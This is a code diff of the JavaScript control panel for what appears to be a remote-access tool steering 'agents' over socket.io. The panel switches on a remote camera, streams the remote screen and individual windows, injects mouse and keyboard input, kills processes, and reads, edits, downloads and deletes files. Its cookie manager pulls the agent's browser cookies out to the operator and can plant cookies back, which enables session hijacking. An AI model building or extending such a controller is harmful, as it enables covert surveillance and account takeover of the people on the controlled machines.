-  if (clipItems.length > 100) clipItems.pop();
-  renderClipboard();
+/* ── File Manager ────────────────────────────────────────── */
+const fmPath   = document.getElementById("fm-path");
+const fmList   = document.getElementById("fm-list");
+const fmEditor = document.getElementById("fm-editor");
+let _editingPath = "";
+
+document.getElementById("fm-go").addEventListener("click", () => {
+  if (!currentAgent) return;
+  socket.emit("list_dir", { path:fmPath.value, _target:currentAgent });
 });
-function renderClipboard() {
-  if (!clipItems.length) { clipList.innerHTML = '<span style="color:var(--dim);padding:10px;font-size:11px;">Nothing copied yet…</span>'; return; }
-  clipList.innerHTML = clipItems.map((c, i) =>
-    `<div class="clip-item" onclick="copyClipItem(${i})">
-      <div class="clip-time">${c.time} — click to copy</div>
-      <div class="clip-text">${escHtml(c.text.slice(0,300))}${c.text.length>300?"…":""}</div>
-    </div>`
-  ).join("");
-}
-function copyClipItem(i) { navigator.clipboard.writeText(clipItems[i].text); }
-function clearClipboard() { clipItems = []; renderClipboard(); }
-
-// ── Processes ─────────────────────────────────────────────────────────────────
-function loadProcs() {
-  if (!selectedAgent) return;
-  socket.emit("get_processes", { _target: selectedAgent });
-}
-socket.on("processes_result", d => {
-  allProcs = d.processes || [];
-  filterProcs();
-});
-function filterProcs() {
-  const q = document.getElementById("proc-search").value.toLowerCase();
-  const filtered = q ? allProcs.filter(p => p.name.toLowerCase().includes(q)) : allProcs;
-  document.getElementById("proc-list").innerHTML = filtered.map(p =>
-    `<div class="proc-row">
-      <span class="proc-name" title="${escAttr(p.name)}">${escHtml(p.name)}</span>
-      <span class="proc-cpu">${p.cpu}%</span>
-      <span class="proc-mem">${p.mem}MB</span>
-      <button class="proc-kill" onclick="killProc(${p.pid})">Kill</button>
-    </div>`
-  ).join("");
-}
-function killProc(pid) {
-  if (!confirm(`Kill PID ${pid}?`)) return;
-  socket.emit("kill_process", { pid, _target: selectedAgent });
-  setTimeout(loadProcs, 500);
-}
-
-// ── Camera ────────────────────────────────────────────────────────────────────
-socket.on("camera_frame", d => { if (cameraActive && d._agent === selectedAgent) camFeed.src = "data:image/jpeg;base64," + d.data; });
-function toggleCamera() {
-  if (!selectedAgent) return;
-  if (cameraActive) {
-    socket.emit("camera_off", { _target: selectedAgent });
-    updateCamUI(false);
-  } else {
-    socket.emit("camera_on", { _target: selectedAgent });
-    updateCamUI(true);
-  }
-}
-function updateCamUI(active) {
-  cameraActive = active;
-  camBtn.innerHTML = active ? "📷 <span class='btn-label'>Camera ON</span>" : "📷 <span class='btn-label'>Camera</span>";
-  camBtn.className = active ? "topbar-btn active" : "topbar-btn";
-  camPanel.className = active ? "visible" : "";
-  camFeed.style.display = active ? "block" : "none";
-  if (!active) { camFeed.src = ""; camPlaceholder.style.display = "block"; camPlaceholder.textContent = "Camera off"; }
-  else camPlaceholder.style.display = "none";
-}
-
-// ── Recording ─────────────────────────────────────────────────────────────────
-let mediaRecorder = null, fileWriter = null, recSeconds = 0, recInterval = null;
-const hasFSA = typeof window.showSaveFilePicker === "function";
-async function toggleRecord() {
-  if (!hasFSA) { alert("Use Chrome or Edge to record."); return; }
-  if (mediaRecorder && mediaRecorder.state === "recording") { mediaRecorder.stop(); return; }
-  try {
-    const ts = new Date().toISOString().replace(/[:.]/g,"-").slice(0,19);
-    const handle = await window.showSaveFilePicker({ suggestedName: `nora_${ts}.webm`, types:[{description:"WebM Video",accept:{"video/webm":[".webm"]}}] });
-    fileWriter = await handle.createWritable();
-    const stream = canvas.captureStream(12);
-    const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
-    mediaRecorder = new MediaRecorder(stream, { mimeType: mime });
-    mediaRecorder.ondataavailable = async e => { if (e.data?.size > 0) await fileWriter.write(e.data); };
-    mediaRecorder.onstop = async () => {
-      await fileWriter.close(); fileWriter = null; mediaRecorder = null;
-      recBtn.innerHTML = "⏺ <span class='btn-label'>REC</span>"; recBtn.className = "topbar-btn";
-      recTimer.className = ""; clearInterval(recInterval); recSeconds = 0;
-    };
-    mediaRecorder.start(1000);
-    recBtn.innerHTML = "⏹ <span class='btn-label'>STOP</span>"; recBtn.className = "topbar-btn recording";
-    recSeconds = 0; recTimer.className = "visible";
-    recInterval = setInterval(() => {
-      recSeconds++;
-      const h = String(Math.floor(recSeconds/3600)).padStart(2,"0");
-      const m = String(Math.floor((recSeconds%3600)/60)).padStart(2,"0");
-      const s = String(recSeconds%60).padStart(2,"0");
-      recTimer.textContent = `● ${h}:${m}:${s}`;
-    }, 1000);
-  } catch(e) {}
-}
-
-// ── Remote control ────────────────────────────────────────────────────────────
-function controlActive() { return ctrlToggle.checked && !!selectedAgent; }
-function cmd(data) { if (controlActive()) socket.emit("command", { ...data, _target: selectedAgent }); }
-
-screenPanel.addEventListener("mousemove", e => {
-  const r = canvas.getBoundingClientRect();
-  const pr = screenPanel.getBoundingClientRect();
-  const x = e.clientX - r.left, y = e.clientY - r.top;
-  if (x < 0 || y < 0 || x > r.width || y > r.height) { cursorEl.style.display = "none"; return; }
-  cursorEl.style.left = (r.left - pr.left + x) + "px";
-  cursorEl.style.top  = (r.top  - pr.top  + y) + "px";
-  cursorEl.style.display = "block";
-  cmd({ action:"mousemove", x, y, sw:r.width, sh:r.height });
-});
-screenPanel.addEventListener("mouseleave", () => { cursorEl.style.display = "none"; });
-screenPanel.addEventListener("mousedown",  e => { const r = canvas.getBoundingClientRect(); if (e.clientX>=r.left&&e.clientX<=r.right&&e.clientY>=r.top&&e.clientY<=r.bottom) cmd({ action:"mousedown", button:e.button }); });
-screenPanel.addEventListener("mouseup",    e => { const r = canvas.getBoundingClientRect(); if (e.clientX>=r.left&&e.clientX<=r.right&&e.clientY>=r.top&&e.clientY<=r.bottom) cmd({ action:"mouseup",   button:e.button }); });
-screenPanel.addEventListener("contextmenu",e => e.preventDefault());
-screenPanel.addEventListener("wheel",      e => cmd({ action:"scroll", delta:e.deltaY<0?3:-3 }));
-document.addEventListener("keydown", e => {
-  if (e.ctrlKey && e.shiftKey && e.key === "D") { ctrlToggle.checked = !ctrlToggle.checked; return; }
-  if (!controlActive() || document.activeElement !== document.body) return;
-  e.preventDefault(); cmd({ action:"keydown", key:e.key });
-});
-document.addEventListener("keyup", e => {
-  if (!controlActive() || document.activeElement !== document.body) return;
-  e.preventDefault(); cmd({ action:"keyup", key:e.key });
-});
-
-// ── Remote Keyboard ───────────────────────────────────────────────────────────
-const kbdWindow = document.getElementById("kbd-window");
-const kbdBox    = document.getElementById("kbd-box");
-const kbdDot    = document.getElementById("kbd-dot");
-const kbdLast   = document.getElementById("kbd-last");
-let kbdOpen = false;
-
-function toggleKbd() {
-  kbdOpen = !kbdOpen;
-  kbdWindow.style.display = kbdOpen ? "block" : "none";
-  if (kbdOpen) { kbdBox.value = ""; kbdBox.focus(); }
-}
-
-kbdBox.addEventListener("keydown", e => {
-  if (!selectedAgent) { kbdLast.textContent = "⚠ No agent selected"; return; }
-  e.preventDefault(); e.stopPropagation();
-  const display = e.key.length === 1 ? e.key : `[${e.key}]`;
-  if (targetHwnd) {
-    socket.emit("win_key", { hwnd: targetHwnd, key: e.key, _target: selectedAgent });
-    kbdLast.textContent = "→ " + targetTitle.substring(0, 20) + ": " + display;
-  } else if (controlActive()) {
-    cmd({ action: "keydown", key: e.key });
-    kbdLast.textContent = "Sent: " + display;
-  } else {
-    kbdLast.textContent = "⚠ Enable Remote Control first"; return;
-  }
-  kbdDot.classList.add("active");
-  clearTimeout(kbdBox._dotTimer);
-  kbdBox._dotTimer = setTimeout(() => kbdDot.classList.remove("active"), 200);
-  setTimeout(() => { kbdBox.value = ""; }, 0);
-});
-
-kbdBox.addEventListener("keyup", e => {
-  e.preventDefault(); e.stopPropagation();
-  if (targetHwnd) return;
-  if (!controlActive()) return;
-  cmd({ action: "keyup", key: e.key });
-});
-
-let _kx=0,_ky=0,_kl=0,_kt=0;
-function kbdDragStart(e) {
-  const r = kbdWindow.getBoundingClientRect();
-  _kx = e.clientX; _ky = e.clientY; _kl = r.left; _kt = r.top;
-  kbdWindow.style.transform = "none";
-  kbdWindow.style.left = _kl + "px"; kbdWindow.style.top = _kt + "px";
-  document.addEventListener("mousemove", kbdDragMove);
-  document.addEventListener("mouseup", kbdDragEnd, {once:true});
-}
-function kbdDragMove(e) {
-  kbdWindow.style.left = (_kl + e.clientX - _kx) + "px";
-  kbdWindow.style.top  = (_kt + e.clientY - _ky) + "px";
-}
-function kbdDragEnd() { document.removeEventListener("mousemove", kbdDragMove); }
-
-// ── Desktop & window control ──────────────────────────────────────────────────
-let targetHwnd = null, targetTitle = "";
-
-function desktopCmd(c) {
-  if (!selectedAgent) return;
-  socket.emit("desktop_cmd", { cmd: c, _target: selectedAgent });
-}
-
-function openWinPicker() {
-  if (!selectedAgent) return;
-  document.getElementById("win-modal").style.display = "block";
-  document.getElementById("win-list").innerHTML = '<div style="padding:14px;color:var(--dim);font-size:11px;">Loading…</div>';
-  socket.emit("list_windows", { _target: selectedAgent });
-}
-function closeWinPicker() { document.getElementById("win-modal").style.display = "none"; }
-function clearWinTarget() {
-  targetHwnd = null; targetTitle = "";
-  document.getElementById("win-target-label").style.display = "none";
-  document.getElementById("win-target-title").textContent = "—";
-  closeWinPicker();
-}
-
-socket.on("windows_list", data => {
-  const list = document.getElementById("win-list");
-  const wins = (data.windows || []).filter(w => w.title.trim());
-  if (!wins.length) { list.innerHTML = '<div style="padding:14px;color:var(--dim);font-size:11px;">No windows found</div>'; return; }
-  list.innerHTML = wins.map(w =>
-    `<div class="win-row${targetHwnd===w.hwnd?' selected':''}" onclick="selectWin(${w.hwnd},${JSON.stringify(w.title)})">
-      <span style="flex:1">${w.title.substring(0,40)}</span>
-      <button class="win-stream-btn" onclick="event.stopPropagation();selectWin(${w.hwnd},${JSON.stringify(w.title)});startWinStream(${w.hwnd})">👁 Stream</button>
-      <span class="win-hwnd">#${w.hwnd}</span>
-    </div>`
-  ).join("");
-});
-
-function selectWin(hwnd, title) {
-  targetHwnd = hwnd; targetTitle = title;
-  const lbl = document.getElementById("win-target-label");
-  document.getElementById("win-target-title").textContent = title.substring(0, 40);
-  lbl.style.display = "block";
-  closeWinPicker();
-}
-
-let winStreaming = false;
-function startWinStream(hwnd) {
-  if (!selectedAgent) return;
-  winStreaming = true;
-  document.getElementById("win-stream-badge").style.display = "block";
-  socket.emit("win_capture_start", { hwnd, _target: selectedAgent });
-  closeWinPicker();
-}
-function stopWinStream() {
-  if (!selectedAgent) return;
-  winStreaming = false;
-  document.getElementById("win-stream-badge").style.display = "none";
-  socket.emit("win_capture_stop", { _target: selectedAgent });
-}
-socket.on("win_frame", d => {
-  if (!winStreaming) return;
-  if (d._agent && d._agent !== selectedAgent) return;
-  frameImg.src = "data:image/jpeg;base64," + d.data;
-});
-
-// ── Cookie manager ────────────────────────────────────────────────────────────
-function cookieExport() {
-  if (!selectedAgent) { alert("Select an agent first."); return; }
-  document.getElementById("ck-export-status").textContent = "Exporting…";
-  document.getElementById("ck-export-btn").disabled = true;
-  socket.emit("export_cookies", { _target: selectedAgent });
-}
-socket.on("cookies_data", d => {
-  const st = document.getElementById("ck-export-status");
-  const btn = document.getElementById("ck-export-btn");
-  btn.disabled = false;
-  if (d.error) { st.style.color = "var(--red)"; st.textContent = "Error: " + d.error; return; }
-  st.style.color = "var(--green)";
-  st.textContent = `Got ${d.count} cookies — downloading…`;
-  const blob = new Blob([JSON.stringify(d.cookies, null, 2)], { type: "application/json" });
-  const url  = URL.createObjectURL(blob);
-  const a    = document.createElement("a");
-  a.href = url; a.download = "cookies_export.json";
-  document.body.appendChild(a); a.click();
-  document.body.removeChild(a); URL.revokeObjectURL(url);
-});
-function cookieImport(input) {
-  const file = input.files[0];
-  if (!file || !selectedAgent) { alert("Select an agent and a JSON file."); return; }
-  const st = document.getElementById("ck-import-status");
-  st.style.color = "var(--muted)"; st.textContent = "Reading file…";
-  const reader = new FileReader();
-  reader.onload = e => {
-    try {
-      const cookies = JSON.parse(e.target.result);
-      st.textContent = `Sending ${cookies.length} cookies…`;
-      socket.emit("import_cookies", { cookies, _target: selectedAgent });
-    } catch { st.style.color = "var(--red)"; st.textContent = "Invalid JSON file."; }
-  };
-  reader.readAsText(file);
-  input.value = "";
-}
-socket.on("import_result", d => {
-  const st = document.getElementById("ck-import-status");
-  st.style.color = d.ok ? "var(--green)" : "var(--red)";
-  st.textContent = d.ok ? "Import done! " + (d.message || "") : "Error: " + d.message;
-});
-
-// PostMessage mouse click routing
-screenPanel.addEventListener("click", e => {
-  if (!targetHwnd || !selectedAgent) return;
-  const r = canvas.getBoundingClientRect();
-  if (e.clientX < r.left || e.clientX > r.right || e.clientY < r.top || e.clientY > r.bottom) return;
-  e.stopImmediatePropagation();
-  const x = e.clientX - r.left, y = e.clientY - r.top;
-  socket.emit("win_mouse", { hwnd: targetHwnd, x, y, sw: r.width, sh: r.height, action: "click", button: e.button, _target: selectedAgent });
-}, true);
-
-// ── Sidebar toggle (mobile) ───────────────────────────────────────────────────
-function toggleSidebar() {
-  document.getElementById("sidebar").classList.toggle("collapsed");
-}
-
-// ── File Manager ──────────────────────────────────────────────────────────────
-let fmCurPath = null;
-const fmList  = document.getElementById("fm-list");
-const fmBread = document.getElementById("fm-breadcrumb");
-
-function fmSetStatus(msg) { fmList.innerHTML = `<div id="fm-status">${escHtml(msg)}</div>`; }
-
-function fmLoadDir(path) {
-  if (!selectedAgent) { fmSetStatus("No agent selected"); return; }
-  fmSetStatus("Loading…");
-  socket.emit("list_dir", { path: path || null, _target: selectedAgent });
-}
+fmPath.addEventListener("keydown", e => { if (e.key==="Enter") document.getElementById("fm-go").click(); });
 
 socket.on("dir_result", d => {
   if (!d) return;
-  fmCurPath = d.path;
-  fmBread.textContent = d.path;
-  if (d.error) { fmSetStatus("Error: " + d.error); return; }
-  const files = d.files || [];
-  if (!files.length) { fmList.innerHTML = '<div id="fm-status">Empty directory</div>'; return; }
-  fmList.innerHTML = files.map((f, i) => {
-    const icon = f.type === "dir" ? "📁" : "📄";
-    const size = f.type === "file" ? fmFmtSize(f.size) : "";
-    return `<div class="fm-row" data-idx="${i}">
-      <span class="fm-icon">${icon}</span>
-      <span class="fm-name" title="${escAttr(f.name)}">${escHtml(f.name)}</span>
-      <span class="fm-meta">${escHtml(size)}</span>
-      <div class="fm-actions">
-        ${f.type === "file" ? `<button class="fm-dl-btn" data-dl="${i}">DL</button>` : ""}
-        <button class="fm-del-btn" data-del="${i}">Del</button>
-      </div>
-    </div>`;
-  }).join("");
-  fmList._files = files;
-  fmList._dir   = d.path;
-  fmList.querySelectorAll(".fm-row").forEach(row => {
-    const i = +row.dataset.idx;
-    const f = files[i];
-    const fullPath = d.path.replace(/\/+$|\\+$/,"") + (d.path.includes("\\") ? "\\" : "/") + f.name;
-    row.addEventListener("click", () => {
-      if (f.type === "dir") fmLoadDir(fullPath);
-      else fmDownload(fullPath, f.name);
+  fmPath.value = d.path||"";
+  fmList.innerHTML = "";
+  fmEditor.classList.remove("show");
+  if (d.parent) {
+    const row = document.createElement("div");
+    row.className = "fm-row";
+    row.innerHTML = `<div class="fm-icon">⬆</div><div class="fm-name">..</div>`;
+    row.addEventListener("click", () => socket.emit("list_dir", { path:d.parent, _target:currentAgent }));
+    fmList.appendChild(row);
+  }
+  (d.items||[]).forEach(item => {
+    const row = document.createElement("div");
+    row.className = "fm-row";
+    row.innerHTML = `<div class="fm-icon">${item.type==="dir"?"📁":"📄"}</div><div class="fm-name">${esc(item.name)}</div><div class="fm-size">${item.type==="file"?fmtBytes(item.size||0):""}</div><button class="fm-del" data-path="${esc(item.path)}">🗑</button>`;
+    row.addEventListener("click", e => {
+      if (e.target.classList.contains("fm-del")) return;
+      item.type==="dir" ? socket.emit("list_dir",{path:item.path,_target:currentAgent}) : socket.emit("read_file",{path:item.path,_target:currentAgent});
     });
-    const dlBtn  = row.querySelector("[data-dl]");
-    const delBtn = row.querySelector("[data-del]");
-    if (dlBtn)  dlBtn.addEventListener("click",  e => { e.stopPropagation(); fmDownload(fullPath, f.name); });
-    if (delBtn) delBtn.addEventListener("click", e => { e.stopPropagation(); fmDelete(fullPath); });
+    row.querySelector(".fm-del").addEventListener("click", e => {
+      e.stopPropagation();
+      if (!confirm("Delete "+item.name+"?")) return;
+      socket.emit("delete_path",{path:item.path,_target:currentAgent});
+    });
+    fmList.appendChild(row);
   });
 });
-
-function fmUp() {
-  if (!fmCurPath) return;
-  const sep = fmCurPath.includes("\\") ? "\\" : "/";
-  const parts = fmCurPath.replace(/[/\\]+$/,"").split(/[\\/]/).filter(Boolean);
-  if (parts.length <= 1) { fmLoadDir(sep); return; }
-  parts.pop();
-  const rejoined = fmCurPath.match(/^[A-Za-z]:/)
-    ? parts[0] + ":\\" + parts.slice(1).join(sep)
-    : sep + parts.join(sep);
-  fmLoadDir(rejoined);
-}
-
-function fmDownload(path, name) {
-  if (!selectedAgent) return;
-  fmSetStatus("Downloading " + name + "…");
-  socket.emit("read_file", { path, _target: selectedAgent });
-}
 
 socket.on("file_data", d => {
-  if (!d) return;
-  if (d.error) { fmSetStatus("Error: " + d.error); return; }
-  try {
-    const binary = atob(d.data);
-    const bytes = new Uint8Array(binary.length);
-    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-    const blob = new Blob([bytes]);
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement("a");
-    a.href = url; a.download = d.name || "file";
-    document.body.appendChild(a); a.click();
-    document.body.removeChild(a); URL.revokeObjectURL(url);
-  } catch(e) { fmSetStatus("Download failed"); return; }
-  fmLoadDir(fmCurPath);
+  _editingPath = d.path||"";
+  document.getElementById("fm-editor-path").textContent = _editingPath;
+  document.getElementById("fm-textarea").value = d.content||"";
+  fmEditor.classList.add("show");
 });
-
-function fmDelete(path) {
-  if (!selectedAgent) return;
-  if (!confirm("Delete:\n" + path + "\n\nThis cannot be undone.")) return;
-  socket.emit("delete_path", { path, _target: selectedAgent });
-}
-
+document.getElementById("fm-save").addEventListener("click", () => {
+  if (!_editingPath || !currentAgent) return;
+  socket.emit("write_file",{path:_editingPath,data:document.getElementById("fm-textarea").value,_target:currentAgent});
+});
+socket.on("write_result", d => toast(d.ok?"File saved.":"Save failed: "+d.error, d.ok?"success":"error"));
 socket.on("delete_result", d => {
-  if (!d) return;
-  if (!d.ok) { alert("Delete failed: " + (d.error || "unknown error")); }
-  fmLoadDir(fmCurPath);
+  toast(d.ok?"Deleted.":"Delete failed.", d.ok?"success":"error");
+  if (d.ok) socket.emit("list_dir",{path:fmPath.value,_target:currentAgent});
 });
 
-function fmUpload(input) {
-  if (!selectedAgent || !input.files.length) return;
-  Array.from(input.files).forEach(file => {
-    const reader = new FileReader();
-    reader.onload = e => {
-      const b64 = btoa(String.fromCharCode(...new Uint8Array(e.target.result)));
-      const destPath = (fmCurPath || "").replace(/\\/g,"/").replace(/\/+$/,"") + "/" + file.name;
-      socket.emit("write_file", { path: destPath, data: b64, _target: selectedAgent });
+/* ── Cookies ─────────────────────────────────────────────── */
+const cookieStatus = document.getElementById("cookie-status");
+document.getElementById("btn-export-cookies").addEventListener("click", () => {
+  if (!currentAgent) return;
+  cookieStatus.textContent = "Exporting cookies…";
+  socket.emit("export_cookies",{_target:currentAgent});
+});
+socket.on("cookies_data", d => {
+  if (d.error) { cookieStatus.textContent = "Error: "+d.error; return; }
+  _exportedCookies = d.cookies||[];
+  cookieStatus.textContent = `Exported ${_exportedCookies.length} cookies. Download started.`;
+  const blob = new Blob([JSON.stringify(_exportedCookies,null,2)],{type:"application/json"});
+  const a = Object.assign(document.createElement("a"),{href:URL.createObjectURL(blob),download:(currentAgent||"cookies")+".json"});
+  a.click(); URL.revokeObjectURL(a.href);
+});
+document.getElementById("btn-import-cookies").addEventListener("click", () => {
+  if (!currentAgent) return;
+  if (_exportedCookies) { socket.emit("import_cookies",{cookies:_exportedCookies,_target:currentAgent}); return; }
+  const inp = document.createElement("input");
+  inp.type="file"; inp.accept=".json";
+  inp.onchange = () => {
+    const fr = new FileReader();
+    fr.onload = e => {
+      try { const c=JSON.parse(e.target.result); socket.emit("import_cookies",{cookies:c,_target:currentAgent}); }
+      catch { cookieStatus.textContent="Invalid JSON."; }
     };
-    reader.readAsArrayBuffer(file);
-  });
-  input.value = "";
-}
-
-socket.on("write_result", d => {
-  if (!d) return;
-  if (!d.ok) { alert("Upload failed: " + (d.error || "unknown error")); return; }
-  fmLoadDir(fmCurPath);
+    fr.readAsText(inp.files[0]);
+  };
+  inp.click();
 });
+socket.on("import_result", d => { cookieStatus.textContent = d.ok?"Import done: "+(d.message||"OK"):"Import error: "+d.message; });
 
-function fmFmtSize(b) {
-  if (b < 1024) return b + " B";
-  if (b < 1048576) return (b/1024).toFixed(1) + " KB";
-  if (b < 1073741824) return (b/1048576).toFixed(1) + " MB";
-  return (b/1073741824).toFixed(1) + " GB";
-}
-
-// ── Helpers ───────────────────────────────────────────────────────────────────
-function escHtml(s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
-function escAttr(s) { return String(s).replace(/"/g,"&quot;").replace(/'/g,"&#39;"); }
+/* ── Recording ───────────────────────────────────────────── */
+let _recording = false;
+const recIndicator = document.getElementById("rec-indicator");
+const recLabel     = document.getElementById("rec-label");
+const recBtn       = document.getElementById("rec-btn");
+recBtn.addEventListener("click", () => {
+  if (!currentAgent) return;
+  _recording = !_recording;
+  socket.emit("command",{action:_recording?"start_recording":"stop_recording",_target:currentAgent});
+  recIndicator.classList.toggle("recording",_recording);
+  recBtn.textContent = _recording?"Stop Recording":"Start Recording";
+  recBtn.classList.toggle("stop",_recording);
+  recLabel.textContent = _recording?"Recording…":"Not recording";
+});
 </script>
 </body>
 </html>
